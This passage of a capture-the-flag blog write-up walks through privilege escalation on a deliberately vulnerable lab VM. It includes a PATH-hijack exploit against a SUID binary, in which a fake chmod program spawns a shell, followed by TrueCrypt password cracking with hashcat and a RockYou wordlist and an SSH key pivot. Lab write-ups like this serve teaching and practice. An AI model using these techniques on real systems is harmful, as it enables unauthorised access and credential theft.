</span><span class='line'>Ok Jack. I<span class="s1">&#39;ve created the account &#39;</span>milk_4_life<span class="s1">&#39; as per your request. Please stop emailing me about this now or I&#39;</span>m going to talk to HR like we discussed.
</span><span class='line'>
</span><span class='line'>The password is <span class="s1">&#39;4J0WWvL5nS&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thank you, Jack, for being a predictable - yet persistent - weirdo. A quick hop and a skip over to the worryingly named milk_4_life account and we can carry on.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su milk_4_life
</span><span class='line'>Password: 4J0WWvL5nS
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>milk_4_life
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>I Want to Play a Game, But No Jigsaws, OK ?!</h2>

<p>The home folder for milk_4_life is pretty sparse, just a binary called &ldquo;game&rdquo;. However, it&rsquo;s owned by the george user, and has the suid attribute set.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -l
</span><span class='line'>total 20
</span><span class='line'>---s--x--x <span class="m">1</span> george      george      <span class="m">5743</span> Jun <span class="m">19</span> 18:24 game
</span></code></pre></td></tr></table></div></figure>


<p>Running the binary produces the following output, which doesn&rsquo;t tell us much other than it&rsquo;s &ldquo;listening&rdquo;. Like a overly intrusive neighbour.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./game
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span></code></pre></td></tr></table></div></figure>


<p>Netstat isn&rsquo;t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ss -lp
</span><span class='line'>State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">50</span>        127.0.0.1:mysql       *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::sunrpc             :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:sunrpc              *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::http               :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::38035              :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:35380               *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::ssh                :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:ssh                 *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">10</span>        *:1337                *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">20</span>        ::1:smtp              :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">20</span>        127.0.0.1:smtp        *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">10</span>        *:666                 *:*
</span></code></pre></td></tr></table></div></figure>


<p>Connecting to the port from another session asks us to type &ldquo;START&rdquo; to begin. It&rsquo;s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>Type <span class="s1">&#39;START&#39;</span> to begin
</span><span class='line'>
</span><span class='line'>banana
</span><span class='line'>No... START. S-T-A-R-T
</span><span class='line'>
</span><span class='line'>Connection closed by foreign host.
</span></code></pre></td></tr></table></div></figure>


<p>OK, enough messing around, let&rsquo;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&rsquo;m not answering any of these correctly !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>Type <span class="s1">&#39;START&#39;</span> to begin
</span><span class='line'>
</span><span class='line'>START
</span><span class='line'>Starting...
</span><span class='line'>
</span><span class='line'>You have <span class="m">30</span> seconds to get as many points as you can, beat the high score! <span class="o">(</span>High Score: 133723<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Quick what<span class="s1">&#39;s... 924 x 541? Umm</span>
</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">982</span> x 21? No idea
</span><span class='line'>Quick what<span class="s1">&#39;s... 194 x 542? Really ?</span>
</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">679</span> x 733? WHY WOULD I NEED TO KNOW THIS !?
</span><span class='line'>Quick what<span class="s1">&#39;s... 960 x 248? I give up.</span>
</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">718</span> x 646? THANKS OBAMA !
</span><span class='line'>Quick what<span class="err">&#39;</span>s... <span class="m">162</span> x 784? ^C
</span><span class='line'>Connection closed by foreign host
</span></code></pre></td></tr></table></div></figure>


<p>Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on &ldquo; x &rdquo; to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">1337</span><span class="p">))</span> <span class="c"># hardcoded IP address</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c"># login procedure</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>    <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s... (.*?)\?&quot;</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">l</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">d</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">mul</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">mul</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">mul</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running it produces a sense of authority over our robot overlords - I&rsquo;m gaming the game.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python gamey3.py
</span><span class='line'>125451
</span><span class='line'>150858
</span><span class='line'>498300
</span><span class='line'>493353
</span><span class='line'>60564
</span><span class='line'>**** SNIP ****
</span><span class='line'>174386
</span><span class='line'>841312
</span><span class='line'>53636
</span><span class='line'>Final Score: 412619
</span><span class='line'>
</span><span class='line'>!*!*!*!*! Congratulations, new high score <span class="o">(</span>412619<span class="o">)</span> !*!*!*!*!
</span><span class='line'>
</span><span class='line'>I hear the faint sound of chmodding.......
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png" alt="high_score_320x320" /></p>

<p>It seems that the binary performs an action when the highscore is beaten. I&rsquo;m not sure what it chmods, but I wonder if we can play this game at it&rsquo;s own game and make it run a bogus binary. There&rsquo;s a distinct possibility the code is relying on the PATH environment variable and just calling system(&ldquo;chmod file&rdquo;) rather than using an absolute path.</p>

<p>So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span> <span class="mi">1000</span> <span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span><span class="s">&quot;id&quot;</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The path environment variable is modified to make /tmp the first location checked</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">export</span> <span class="p">|</span> grep PATH
</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s1">&#39;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I&rsquo;m not going to show you again, just scroll up if you want to see what it looks like).</p>

<p>The score is beaten and we are indeed dropped to a new shell as the george user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./game
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>milk_4_life<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>george<span class="o">)</span>,1002<span class="o">(</span>milk_4_life<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>

<hr />

<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>

<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>

<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>:
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc:
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>No password or keyfile specified.
</span></code></pre></td></tr></table></div></figure>


<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>From: admin@rockyou.com
</span><span class='line'>To: super_admin@hell.com
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009
</span><span class='line'>
</span><span class='line'>Thanks <span class="k">for</span> signing up <span class="k">for</span> your account. I hope you enjoy our services.
</span></code></pre></td></tr></table></div></figure>


<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>G:<span class="se">\D</span>ownloads<span class="se">\o</span>clHashcat-1.21&gt;oclHashcat64.exe -m <span class="m">6211</span> -a <span class="m">0</span> <span class="s2">&quot;g:\downloads\container.tc&quot;</span> g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt
</span><span class='line'>
</span><span class='line'>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
</span><span class='line'>
</span><span class='line'>Session.Name...: oclHashcat
</span><span class='line'>Status.........: Cracked
</span><span class='line'>Input.Mode.....: File <span class="o">(</span>g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt<span class="o">)</span>
</span><span class='line'>Hash.Target....: File <span class="o">(</span>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc<span class="o">)</span>
</span><span class='line'>Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
</span><span class='line'>Time.Started...: Sat Jul <span class="m">12</span> 23:06:15 <span class="m">2014</span> <span class="o">(</span><span class="m">17</span> secs<span class="o">)</span>
</span><span class='line'>Speed.GPU.#1...:    <span class="m">29889</span> H/s
</span><span class='line'>Recovered......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
</span><span class='line'>Progress.......: 496641/14343296 <span class="o">(</span>3.46%<span class="o">)</span>
</span><span class='line'>Skipped........: 0/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>Rejected.......: 1/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>HWMon.GPU.#1...: 97% Util, 56c Temp, 32% Fan
</span><span class='line'>
</span><span class='line'>Started: Sat Jul <span class="m">12</span> 23:06:15 2014
</span><span class='line'>Stopped: Sat Jul <span class="m">12</span> 23:06:37 2014
</span></code></pre></td></tr></table></div></figure>


<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>: ./tc
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>
</span><span class='line'>george@hell:~<span class="nv">$ </span><span class="nb">cd </span>tc
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx------ <span class="m">1</span> george george <span class="m">1679</span> Jul  <span class="m">5</span> 20:01 id_rsa
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~/tc<span class="nv">$ </span>ssh bazza@127.0.0.1 -i ./id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul <span class="m">13</span> 21:18:28 <span class="m">2014</span> from 192.168.0.102
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>bazza
</span></code></pre></td></tr></table></div></figure>


<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>

<hr />

<h2>Bazza&rsquo;s Blockade</h2>

<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@6</span>
</span><span class='line'>  <span class="n">_BYTE</span> <span class="n">v1</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="c1">// [sp+19h] [bp-417h]@3</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+424h] [bp-Ch]@1</span>
</span><span class='line'>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+428h] [bp-8h]@1</span>
</span><span class='line'>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+42Ch] [bp-4h]@1</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v4</span> <span class="o">=</span> <span class="s">&quot;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v3</span> <span class="o">=</span> <span class="s">&quot;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Checking integrity of part2...&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">v2</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="s">&quot;sha256sum /home/bazza/part2&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v2</span> <span class="p">)</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Failed to run command&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fgets</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mi">1034</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="n">v4</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Uh oh.... Corrupted or in wrong directory (/home/bazza/)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot; Done!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Checking integrity of calling target...&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">v2</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="s">&quot;sha256sum /usr/bin/id&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v2</span> <span class="p">)</span>
